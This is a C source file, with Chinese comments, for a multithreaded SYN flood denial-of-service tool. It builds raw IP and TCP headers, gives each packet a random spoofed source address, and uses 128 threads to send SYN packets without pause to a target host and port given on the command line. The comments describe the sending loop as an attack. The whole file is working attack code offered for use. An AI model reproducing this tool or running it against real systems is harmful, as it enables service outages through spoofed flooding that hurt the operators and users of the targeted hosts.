#include <stdio.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>
#include <netdb.h>
#include <errno.h>
#include <stdlib.h>
#include <time.h>
#include <arpa/inet.h>

/* 最多线程数 */
#define MAXCHILD 128

/* 原始套接字 */
int sockfd;

/* 程序活动标志 */
static int alive = -1;

char dst_ip[20] = {0}; // 目标IP地址
int dst_port;          // 目标端口号

struct ip
{
    unsigned char hl;              // 版本和头部长度
    unsigned char tos;             // 服务类型
    unsigned short total_len;      // 总长度
    unsigned short id;             // 标识符
    unsigned short frag_and_flags; // 标志和片偏移
    unsigned char ttl;             // 生存时间
    unsigned char proto;           // 协议
    unsigned short checksum;       // 校验和
    unsigned int sourceIP;         // 源IP地址
    unsigned int destIP;           // 目标IP地址
};

struct tcphdr
{
    unsigned short sport; // 源端口号
    unsigned short dport; // 目标端口号
    unsigned int seq;     // 序列号
    unsigned int ack;     // 确认号
    unsigned char lenres; // 长度和保留位
    unsigned char flag;   // 标志位
    unsigned short win;   // 窗口大小
    unsigned short sum;   // 校验和
    unsigned short urp;   // 紧急指针
};

struct pseudohdr
{
    unsigned int saddr;    // 源IP
    unsigned int daddr;    // 目的IP
    char zero;             // 保留位
    char protocol;         // 协议
    unsigned short length; // 首部长度
};

/* CRC16校验 */
unsigned short inline checksum(unsigned short *buffer, unsigned short size)
{
    // 对给定缓冲区中的数据进行累加求和，并进行溢出处理，最后取反得到校验和值。
    unsigned long cksum = 0;

    while (size > 1)
    {
        cksum += *buffer++;
        size -= sizeof(unsigned short);
    }

    if (size)
    {
        cksum += *(unsigned char *)buffer;
    }

    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);

    return ((unsigned short)(~cksum));
}

/* 发送SYN包函数
 * 填写IP头部，TCP头部
 * TCP伪头部仅用于校验和的计算

 */
void init_header(struct ip *ip, struct tcphdr *tcp, struct pseudohdr *pseudoheader)
{
    // IP头部、TCP头部和TCP伪头部的指针作为参数
    // 根据需要设置各个字段的值，如版本号、长度、标志位、校验和等。
    int len = sizeof(struct ip) + sizeof(struct tcphdr);
    // IP头部数据初始化
    ip->hl = (4 << 4 | sizeof(struct ip) / sizeof(unsigned int));
    ip->tos = 0;
    ip->total_len = htons(len);
    ip->id = 1;
    ip->frag_and_flags = 0x40;
    ip->ttl = 255;
    ip->proto = IPPROTO_TCP;
    ip->checksum = 0;
    ip->sourceIP = 0;
    ip->destIP = inet_addr(dst_ip);

    // TCP头部数据初始化
    tcp->sport = htons(rand() % 16383 + 49152);
    tcp->dport = htons(dst_port);
    tcp->seq = htonl(rand() % 90000000 + 2345);
    tcp->ack = 0;
    tcp->lenres = (sizeof(struct tcphdr) / 4 << 4 | 0);
    tcp->flag = 0x02;
    tcp->win = htons(2048);
    tcp->sum = 0;
    tcp->urp = 0;

    // TCP伪头部
    pseudoheader->zero = 0;
    pseudoheader->protocol = IPPROTO_TCP;
    pseudoheader->length = htons(sizeof(struct tcphdr));
    pseudoheader->daddr = inet_addr(dst_ip);
    srand((unsigned)time(NULL));
}

/* 发送SYN包函数
 * 填写IP头部，TCP头部
 * TCP伪头部仅用于校验和的计算
 *
 */
void send_synflood(struct sockaddr_in *addr)
{
    // 使用随机生成的源IP地址，循环发送构造好的IP头部和TCP头部组成的SYN包。
    // 在每次循环中，先计算IP头部和TCP头部的校验和，然后将它们填充到发送缓冲区中，并调用sendto函数发送SYN包。
    char buf[100], sendbuf[100];
    int len;
    struct ip ip;                  // IP头部
    struct tcphdr tcp;             // TCP头部
    struct pseudohdr pseudoheader; // TCP伪头部

    len = sizeof(struct ip) + sizeof(struct tcphdr);

    /* 初始化头部信息 */
    init_header(&ip, &tcp, &pseudoheader);

    /* 处于活动状态时持续发送SYN包 */
    while (alive)
    {
        ip.sourceIP = rand();

        // 计算IP校验和
        bzero(buf, sizeof(buf));
        memcpy(buf, &ip, sizeof(struct ip));
        ip.checksum = checksum((u_short *)buf, sizeof(struct ip));

        pseudoheader.saddr = ip.sourceIP;

        // 计算TCP校验和
        bzero(buf, sizeof(buf));
        memcpy(buf, &pseudoheader, sizeof(pseudoheader));
        memcpy(buf + sizeof(pseudoheader), &tcp, sizeof(struct tcphdr));
        tcp.sum = checksum((u_short *)buf, sizeof(pseudoheader) + sizeof(struct tcphdr));

        bzero(sendbuf, sizeof(sendbuf));
        memcpy(sendbuf, &ip, sizeof(struct ip));
        memcpy(sendbuf + sizeof(struct ip), &tcp, sizeof(struct tcphdr));
        printf(".");
        if (
            sendto(sockfd, sendbuf, len, 0, (struct sockaddr *)addr, sizeof(struct sockaddr)) < 0)
        {
            perror("sendto()");
            pthread_exit("fail");
        }
        // sleep(1);
    }
}

/* 信号处理函数,设置退出变量alive */
void sig_int(int signo)
{
    alive = 0;
}

/* 主函数 */
int main(int argc, char *argv[])
{
    // 1. 首先解析命令行参数，获取目标主机和端口信息。
    // 2. 通过gethostbyname函数获取目标主机的IP地址
    // 3. 创建原始套接字，设置套接字选项，允许应用程序构造IP头部
    // 4. 初始化目标地址结构体，并将alive标志设置为1
    // 5. 设置信号处理函数
    // 6. 开始发送SYN包进行攻击
    struct sockaddr_in addr;
    struct hostent *host = NULL;

    int on = 1;
    int i = 0;
    pthread_t pthread[MAXCHILD];
    int err = -1;

    alive = 1;
    /* 截取信号CTRL+C */
    signal(SIGINT, sig_int);

    /* 参数是否数量正确 */
    if (argc < 3)
    {
        printf("usage: syn <IPaddress> <Port>\n");
        exit(1);
    }

    strncpy(dst_ip, argv[1], 16);
    dst_port = atoi(argv[2]);

    bzero(&addr, sizeof(addr));

    addr.sin_family = AF_INET;
    addr.sin_port = htons(dst_port);

    if (inet_addr(dst_ip) == INADDR_NONE)
    {
        /* 为DNS地址，查询并转换成IP地址 */
        host = gethostbyname(argv[1]);
        if (host == NULL)
        {
            perror("gethostbyname()");
            exit(1);
        }
        addr.sin_addr = *((struct in_addr *)(host->h_addr));
        strncpy(dst_ip, inet_ntoa(addr.sin_addr), 16);
    }
    else
        addr.sin_addr.s_addr = inet_addr(dst_ip);

    if (dst_port < 0 || dst_port > 65535)
    {
        printf("Port Error\n");
        exit(1);
    }

    printf("host ip=%s\n", inet_ntoa(addr.sin_addr));

    /* 建立原始socket */
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0)
    {
        perror("socket()");
        exit(1);
    }
    /* 设置IP选项 */
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) < 0)
    {
        perror("setsockopt()");
        exit(1);
    }

    /* 将程序的权限修改为普通用户 */
    setuid(getpid());

    /* 建立多个线程协同工作 */
    for (i = 0; i < MAXCHILD; i++)
    {
        err = pthread_create(&pthread[i], NULL, send_synflood, &addr);
        if (err != 0)
        {
            perror("pthread_create()");
            exit(1);
        }
    }

    /* 等待线程结束 */
    for (i = 0; i < MAXCHILD; i++)
    {
        err = pthread_join(pthread[i], NULL);
        if (err != 0)
        {
            perror("pthread_join Error\n");
            exit(1);
        }
    }

    close(sockfd);

    return 0;
}